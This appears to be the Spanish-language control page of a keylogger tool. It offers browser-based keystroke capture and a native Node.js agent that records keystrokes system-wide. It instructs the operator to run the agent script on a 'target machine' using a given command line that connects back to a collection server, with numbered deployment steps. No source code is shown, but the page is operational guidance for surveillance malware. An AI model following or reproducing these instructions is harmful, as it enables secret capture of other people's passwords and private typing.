Keylogger Agent

Elige cómo deseas ejecutar el agente de keylogger: desde el navegador o como aplicación nativa.

Opción 1: Agente en Navegador

Captura teclas dentro del navegador mientras esta página tiene foco.

Nota: la captura global real de teclas se hace usando el agente nativo de Node.js. Abre `keylogger-agent.js` en la máquina objetivo y ejecútalo con Node.

Estado del agente

Esperando conexión.

Teclas enviadas

Todavía no se han enviado teclas.

Opción 2: Agente Nativo (Global)

Captura teclas de todo el sistema operativo, no solo del navegador.

node keylogger-native.js --server 127.0.0.1 --port 3001 --label agente-remoto

Pasos:
1. Descarga o copia keylogger-native.js del servidor
2. Abre PowerShell/Terminal en esa carpeta
3. Presiona "Copiar" y pega en la terminal
4. Verás "[✓ CONECTADO]" cuando se conecte
5. Escribe en cualquier lugar del sistema

⚠️ Nota: Requiere Node.js instalado en la máquina remota
